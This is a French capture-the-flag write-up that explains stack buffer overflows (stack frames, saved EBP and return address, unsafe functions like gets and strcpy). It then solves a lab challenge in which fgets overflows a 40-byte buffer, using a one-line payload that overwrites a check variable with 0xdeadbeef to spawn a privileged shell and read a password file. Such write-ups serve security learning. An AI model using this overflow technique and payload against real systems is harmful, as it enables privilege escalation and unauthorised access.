## Contexte

Un buffer overflow (débordement de tampon) arrive quand un programme écrit plus de données que la taille prévue d’un buffer (tableau) en mémoire.

Sur une pile la zone memoire ressemble à :

` [ buf ][ variables ][ saved EBP ][ saved RET ] `

Donc si on fait deborder `buf` on écrasera:

Les autres variables , l'adresse de retour et le pointeur de base (ebp)...

**RET** = l’endroit où le programme doit revenir après avoir fini la fonction.
**EBP** = Base Pointer
C’est un registre du CPU qui sert à pointer le début du frame de la fonction
Quand une focntion est appelée, on crée une stack frame comme ceci:

```

    +-------------------+
    | Arguments         |
    +-------------------+
    | Adresse de retour |  <-- RET (saved RIP/EIP)
    +-------------------+
    | Ancien EBP        |  <-- saved EBP
    +-------------------+
    | Variables locales |  <-- buf, check, etc.
    +-------------------+


```

Lorsque la fonction commence, elle exécute l’instruction :
```
push ebp
mov ebp, esp
```

Ce qui signifie :

On sauvegarde l'ancien EBP dans la pile (saved EBP).

On met ebp = esp pour créer un nouveau cadre (frame) pour main.

Ce saved EBP sert à :

Restaurer l’EBP quand la fonction finit.

Accéder proprement aux variables locales ([ebp - X]) ou arguments ([ebp + Y]).





### Pourquoi ca arrive ?

Certains appel ne controle pas la taille:

gets() (toujours dangereux)
strcpy()
sprintf() (renvoie le nombre d'octets ecrits dans le tableau, sans compter le caractere null de fin)

### A quoi ca sert?

#### Modifier une variable

Un débordement peut écraser les variables suivantes dans la pile et déclencher :

un accès admin,

un passage dans un chemin caché du programme,

un shell.

#### Corrompre l'adresse de retour

Écraser l’adresse de retour (RET) pour faire exécuter ton propre shell code.

 ```
AAAAAAAAAAAAAAAAAAAA (remplissage)
[adresse du shellcode]

```

execve("/bin/sh")

désactiver un mot de passe

ouvrir une backdoor

etc.

## Le chall

```
#include <unistd.h>
#include <sys/types.h>
#include <stdlib.h>
#include <stdio.h>
 
int main()
{
 
  int var;
  int check = 0x04030201;
  char buf[40];
 
  fgets(buf,45,stdin);
 
  printf("\n[buf]: %s\n", buf);
  printf("[check] %p\n", check);
 
  if ((check != 0x04030201) && (check != 0xdeadbeef))
    printf ("\nYou are on the right way!\n");
 
  if (check == 0xdeadbeef)
   {
     printf("Yeah dude! You win!\nOpening your shell...\n");
     setreuid(geteuid(), geteuid());
     system("/bin/bash");
     printf("Shell closed! Bye.\n");
   }
   return 0;
}


```

Le probleme se trouve ici:

```
char buf[40];
fgets(buf,45,stdin);
```

et ici
```
 if (check == 0xdeadbeef)
```

En prenant en compte les inversions des octets (petit boutien) on prépare le payload :

`echo aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa$(printf '\xef\xbe\xad\xde') > /tmp/payload.txt`


Et apres avec un petit `cat ./passwd` ca passe




